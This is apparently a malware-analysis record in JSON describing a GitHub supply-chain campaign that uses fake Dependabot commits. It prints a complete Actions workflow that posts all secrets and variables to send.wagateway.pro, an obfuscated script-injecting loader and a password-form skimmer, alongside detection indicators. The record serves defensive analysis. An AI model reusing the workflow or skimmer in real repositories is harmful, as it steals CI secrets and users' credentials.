@@ -1,0 +1,141 @@
+{
+  "package_info": {
+    "package_name": "N/A (malicious GitHub Actions workflow + JS file patching campaign)",
+    "package_manager": "GitHub (Actions/Repositories)",
+    "package_versions": "N/A (affects all repository versions where the workflow or JS patch is committed)",
+    "why_malicious": "The campaign leverages stolen GitHub personal access tokens to inject malicious GitHub Actions workflows and append obfuscated JavaScript code to hundreds of repositories. The injected workflow exfiltrates all repository secrets and variables to an attacker-controlled server on every push event, while the patched JavaScript files load a remote payload that intercepts user credentials from password forms and exfiltrates them. The attacker disguises these commits as Dependabot updates to evade detection, resulting in a large-scale supply chain attack targeting both CI/CD secrets and end-user credentials."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "ci-cd (on: push)",
+        "file_location": ".github/workflows/hook.yml",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "name: hook\non: [push]\njobs:\n  env:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Run\n        env:\n          MY_ENV: ${{ toJSON(secrets) }}\n          MY_VARS: ${{ toJSON(vars) }}\n        run: |\n          echo $MY_ENV | curl \"https://send.wagateway.pro/webhook\" -H \"Content-Type: application/json\" -d @-\n          echo $MY_VARS | curl \"https://send.wagateway.pro/webhook\" -H \"Content-Type: application/json\" -d @-",
+      "code_language": "yaml/shell",
+      "code_behavior": "On every push event in the repository, the workflow serializes all GitHub secrets and variables, sends them via HTTPS POST requests to a hardcoded attacker-controlled domain, resulting in exfiltration of sensitive data.",
+      "malice_analysis": {
+        "why_suspicious": "This workflow is explicitly designed to collect and exfiltrate all repository secrets and variables to an external server, which is never a legitimate use case in CI/CD pipelines.",
+        "violated_expectations": "Standard GitHub Actions workflows are intended for automating build, test, or deployment tasks, not for transmitting secrets or variables to untrusted external endpoints. This workflow's sole purpose is to leak sensitive data.",
+        "similar_legitimate_use": "No legitimate workflow should ever transmit all secrets or variables to an external, non-corporate endpoint. Even for integrations, secrets are sent only to trusted, documented services and never in bulk.",
+        "key_indicators": [
+          "Exfiltration of all secrets and variables via network requests",
+          "Hardcoded external domain (send.wagateway.pro)",
+          "Workflow triggers on every push event",
+          "Absence of any legitimate build, test, or deploy steps",
+          "Use of toJSON(secrets) and toJSON(vars) to serialize all sensitive data"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (browser execution of patched JS files)",
+        "file_location": "All *.js files in the repository (appended line)",
+        "required_permissions": [
+          "network",
+          "DOM access"
+        ]
+      },
+      "code_snippet": "if(typeof n!=\"function\")var n=function(r){return new Promise(function(c,r){let o=document.querySelector('script[id=\"hook-loader\"]');o==null&&(document.createElement('script').on=String.fromCharCode(....),document.head.appendChild(d))}).then(function(){window._lol=new Hook,window._lol.init(console.error)}).catch(console.error)};//4bc3124b0e193e0a3fcefa214b1724e0e8d8cf8edfee0feb27a1d5b9",
+      "code_language": "javascript",
+      "code_behavior": "At runtime in the browser, the appended obfuscated code checks for the presence of a specific script tag, and if absent, injects a new script element that loads a remote JavaScript payload from an attacker-controlled domain, resulting in execution of untrusted code in the user's browser context.",
+      "malice_analysis": {
+        "why_suspicious": "The code is obfuscated, appended to all JavaScript files, and dynamically loads a remote script from an untrusted domain, which is a hallmark of web supply chain attacks.",
+        "violated_expectations": "Legitimate JavaScript files should not inject remote scripts from unknown domains, especially using obfuscated code and mass-appending to all files. Such behavior bypasses code review and introduces untrusted code into production.",
+        "similar_legitimate_use": "Dynamic script loading is sometimes used for analytics or feature toggles, but never in an obfuscated, mass-appended, and unreviewed manner targeting all JS files.",
+        "key_indicators": [
+          "Obfuscated code appended to all JavaScript files",
+          "Dynamic injection of script tag referencing attacker domain",
+          "Loads remote script from send.wagateway.pro/client.js",
+          "No legitimate feature, documentation, or user-facing purpose",
+          "Presence of unique hash-like comment for tracking"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (browser, after remote script loads)",
+        "file_location": "https://send.wagateway.pro/client.js (remote payload)",
+        "required_permissions": [
+          "DOM access",
+          "network"
+        ]
+      },
+      "code_snippet": "const t = window.querySelectorAll(\"input[type='password']\").length > 0;\nconst windowMessageHandler = c(async(event) => {\n  event.preventDefault();\n  const builtMail = event.target.formSerializeObject();\n  await this.send(builtMail).then(...);\n  event.target.submit();\n});\nif (t) { screenHandler(true); }",
+      "code_language": "javascript",
+      "code_behavior": "At runtime in the browser, after the remote script is loaded, the code detects the presence of password input fields, hooks form submissions, serializes entered credentials, sends them to the attacker's server, and then allows the form to submit normally, resulting in silent credential exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Intercepting password form submissions and exfiltrating user credentials to an external server is a classic credential-stealing technique and is never legitimate in production code.",
+        "violated_expectations": "Legitimate scripts may hook forms for validation or analytics, but should never serialize and transmit user credentials to untrusted endpoints. This code is designed to steal sensitive information without user awareness.",
+        "similar_legitimate_use": "Form validation or analytics scripts may hook form submissions, but never to exfiltrate credentials. Legitimate uses always respect user privacy and data boundaries.",
+        "key_indicators": [
+          "Hooks password input forms in the DOM",
+          "Serializes and sends credentials to external server",
+          "Runs in all browser contexts where the JS is loaded",
+          "Uses event.preventDefault() to intercept form submission",
+          "Sends data before allowing normal form submission"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker obtains developer's GitHub personal access token (likely via a malicious package or environment compromise).",
+      "implemented_by": [],
+      "leads_to": "Attacker can authenticate as the victim on GitHub."
+    },
+    {
+      "step": 2,
+      "action": "Attacker uses stolen token to push fake Dependabot commits to victim's repositories, adding a malicious GitHub Actions workflow and appending obfuscated code to JavaScript files.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Malicious code is present in the repository and will execute on CI/CD and in browsers."
+    },
+    {
+      "step": 3,
+      "action": "On every push, the malicious GitHub Action exfiltrates repository secrets and variables to the attacker's server.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Attacker gains access to sensitive repository secrets."
+    },
+    {
+      "step": 4,
+      "action": "When end-users load the compromised JavaScript files in their browsers, the appended code loads a remote script that intercepts password forms and exfiltrates credentials.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Attacker receives user credentials submitted via web forms."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Creation or modification of GitHub Actions workflow files that POST secrets or variables to external, non-corporate domains",
+      "Mass modification of *.js files with appended obfuscated code that injects a script tag loading a remote payload",
+      "Commits with fake Dependabot or bot-like messages introducing suspicious workflow or JavaScript changes",
+      "Browser JavaScript code that hooks password forms and sends serialized credentials to unknown endpoints"
+    ],
+    "file_indicators": [
+      ".github/workflows/hook.yml",
+      "Any *.js file with appended obfuscated code that injects a script tag referencing send.wagateway.pro/client.js",
+      "Script tags in HTML referencing send.wagateway.pro/client.js"
+    ],
+    "network_indicators": [
+      "send.wagateway.pro",
+      "https://send.wagateway.pro/webhook",
+      "https://send.wagateway.pro/client.js"
+    ],
+    "how_to_detect": "Monitor for new or modified GitHub Actions workflows that POST secrets or variables to external domains. Scan repository JavaScript files for appended obfuscated code that injects remote scripts, especially those referencing send.wagateway.pro. Flag commits with bot-like or fake Dependabot messages that introduce such changes. In browser environments, detect scripts that hook password forms and send data to non-corporate endpoints. Block or alert on network traffic to known malicious domains such as send.wagateway.pro. Correlate these indicators to identify supply chain compromise."
+  }
+}
